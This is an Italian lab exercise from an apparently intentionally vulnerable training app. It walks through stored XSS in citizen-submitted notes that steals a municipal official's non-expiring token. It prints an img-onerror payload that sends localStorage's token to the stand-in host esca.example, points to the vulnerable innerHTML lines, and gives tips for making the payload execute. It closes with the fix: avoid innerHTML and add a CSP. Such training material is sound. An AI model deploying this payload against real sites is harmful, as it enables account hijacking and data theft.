# L15 — XSS conservata e furto del token

**Capitolo:** 4 · **OWASP:** A03 Injection · **Servizio:** `api`, `web`

## Obiettivo

Scrivere una nota come cittadino ed eseguire codice nel browser del funzionario che la legge.
Poi usare quel codice per prendere il suo token.

## Dove guardare

`POST /api/pratiche/{id}/nota` (scrive il cittadino) e `GET /api/sportello/pratiche` con la
schermata `#/sportello` della SPA (legge il funzionario). La stessa nota è resa anche dalla
pagina legacy `GET /sportello/pratica/{id}`.

## Cosa si ottiene

Il token del funzionario. La nota contiene
`<img src=x onerror="fetch('http://esca.example/?t='+localStorage.getItem('adu.token'))">`;
quando il funzionario apre lo sportello, la SPA inserisce la nota con `innerHTML`, l'immagine non
esiste, l'`onerror` parte e il token esce dal dominio.

Il token non scade e non è revocabile (L09): quello che esce vale per sempre. È la ragione per
cui i due capitoli si spiegano insieme.

## Nel codice

| Riga | Cosa fa |
|---|---|
| `api/app/Http/Controllers/Api/AreaController.php:280` | il cittadino scrive la nota, che viene conservata così com'è |
| `api/app/Http/Controllers/Api/AreaController.php:312` | il funzionario legge le sue pratiche, note comprese |
| `web/app.js:490` | `nota.innerHTML = n.corpo` — il punto in cui il testo diventa codice |
| `api/public/sportello/index.php:100` | la stessa nota resa senza escape anche nella pagina legacy |

## Trappole

- Il payload non deve rompere l'HTML: un `<script>` inserito con `innerHTML` **non** viene
  eseguito (lo standard lo vieta), un `<img onerror>` sì. È la trappola che fa perdere più tempo.
- Il funzionario vede solo le pratiche assegnate a lui: scegli una pratica della sua lista, poi
  scrivi la nota come il cittadino proprietario (il dizionario di L08 basta).
- La nota resta nel database: `lab:reset` la cancella, ma sul portale vero non si può tornare
  indietro.

## Collegamento

Chiude la scalata: cittadino → funzionario senza indovinare nessuna password. La correzione non
è «filtrare il campo note»: è non usare `innerHTML` per contenuto che viene da fuori, più una CSP
che renda inutile l'esecuzione anche quando la si sbaglia.
